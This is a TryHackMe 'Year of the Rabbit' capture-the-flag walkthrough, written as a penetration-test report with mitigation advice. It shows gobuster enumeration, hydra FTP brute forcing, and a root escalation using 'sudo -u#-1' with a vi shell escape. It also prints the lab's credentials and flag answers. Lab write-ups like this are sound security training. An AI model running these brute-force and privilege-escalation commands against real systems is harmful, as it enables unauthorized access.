# Year of the Rabbit – TryHackMe VAPT Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 14, 2025  
**Difficulty:** Medium  
**Category:** Web Exploitation / Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open ports, services, and potential vulnerabilities.
- **Commands Used:**  
  ```bash
  nmap -A <target_ip>
  gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
  ```
- **Findings:**
  - Open ports: HTTP (80), FTP (21), SSH (22).
  - Gobuster revealed directories: `/.hta`, `/.htpasswd`, `/.htaccess` (403), `/assets` (301), `/index.html` (200), `/server-status` (403).
  - `/assets` contained a CSS file and a fake lead pointing to `/sup3r_s3cr3t_flag.php`.
  - Intercepted HTTP request revealed a hidden directory `/WExYY2Cv-qU` containing an image.
  - Strings in the image provided FTP username `ftpuser` and a password list.

---

## 2. Exploitation Process

### Step 1 – Web Application Enumeration
- Enumerated web server using Gobuster, identifying `/assets` and `/sup3r_s3cr3t_flag.php`.
- Intercepted request via Burp Suite revealed:
  ```http
  GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
  ```
- Found an image in `/WExYY2Cv-qU`. Extracted strings revealed FTP credentials.

### Step 2 – FTP Credential Brute Force
- Used `hydra` to brute-force FTP with provided username `ftpuser` and password list:
  ```bash
  hydra -l ftpuser -P ftp_pass.txt ftp://<target_ip>
  ```
- **Result:** Obtained valid FTP password.
- Downloaded a file containing Brainfuck code.

### Step 3 – Brainfuck Code Analysis
- Decoded Brainfuck code, yielding:
  ```text
  User: eli
  Password: DSpDiM1wAEwid
  ```

### Step 4 – SSH Access
- Logged in via SSH using credentials `eli:DSpDiM1wAEwid`:
  ```bash
  ssh eli@<target_ip>
  ```
- Found a message from Root to Gwendoline about a secret hiding place.

### Step 5 – Hidden File Discovery
- Navigated to `/usr/games/s3cr3t` and found a hidden file:
  ```bash
  cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
  ```
- Revealed Gwendoline’s password: `MniVCQVhQHUNI`.

### Step 6 – User Privilege Escalation
- Switched to `gwendoline` user:
  ```bash
  su gwendoline
  ```
- Read `user.txt`:
  ```text
  THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
  ```

### Step 7 – Root Privilege Escalation
- Checked `sudo -l` for `gwendoline`:
  ```text
  User gwendoline may run the following commands on year-of-the-rabbit:
      (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
  ```
- Exploited `vi` to gain root access by running:
  ```bash
  sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
  ```
- Inside `vi`, executed `:!/bin/bash` to spawn a root shell.
- Navigated to `/root` and read `root.txt`:
  ```text
  THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
  ```

---

## 3. Proof of Concept (PoC)

- **Web Enumeration:**  
  ```bash
  gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
  ```
  Revealed hidden directories and files.
- **FTP Brute Force:**  
  ```bash
  hydra -l ftpuser -P ftp_pass.txt ftp://<target_ip>
  ```
  Obtained FTP access.
- **SSH Access:**  
  ```bash
  ssh eli@<target_ip>
  ```
  Used Brainfuck-decoded credentials.
- **Privilege Escalation:**  
  ```bash
  sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
  ```
  Spawned root shell via `vi` exploit.

---

## 4. Privilege Escalation

- Exploited `gwendoline`’s `sudo` privileges for `vi` to run a root shell.
- Used `sudo -u#-1` to bypass restrictions and gain root access.

---

## 5. Mitigation Recommendations

- **Web Server Hardening:**  
  - Remove or restrict access to sensitive files (e.g., `/sup3r_s3cr3t_flag.php`, `/intermediary.php`).
  - Sanitize parameters in `intermediary.php` to prevent directory traversal.
- **FTP Security:**  
  - Enforce strong, unique passwords.
  - Disable anonymous FTP access.
  - Implement account lockout after failed attempts.
- **SSH Security:**  
  - Use strong passwords or key-based authentication.
  - Enable multi-factor authentication.
- **Sudo Configuration:**  
  - Restrict `sudo` commands to prevent privilege escalation (e.g., avoid allowing `vi` without restrictions).
  - Remove unnecessary `NOPASSWD` entries.
- **File System Security:**  
  - Restrict access to sensitive directories like `/usr/games/s3cr3t`.
  - Use proper file permissions to prevent unauthorized access.
- **Patch Management:**  
  - Regularly update system packages and remove unnecessary services.
  - Monitor for suspicious activity in logs.

---

## 6. Lessons Learned

- **Hidden Files and Directories:** Exposed sensitive information can lead to credential leaks.
- **Weak Credentials:** Easily brute-forced passwords enable unauthorized access.
- **Misconfigured Sudo Privileges:** Allowing `vi` execution without restrictions can lead to root access.
- **Brainfuck Code:** Decoding obscure formats can reveal critical credentials.
- **Privilege Escalation:** Combining user access with misconfigured permissions can compromise the entire system.

---

## 7. Skills Practiced

- Network scanning (`nmap`, `gobuster`)
- Web application enumeration and Burp Suite interception
- FTP brute-forcing with `hydra`
- Brainf*** code analysis
- SSH exploitation
- Sudo privilege escalation via `vi`
- Secure reporting and mitigation strategies
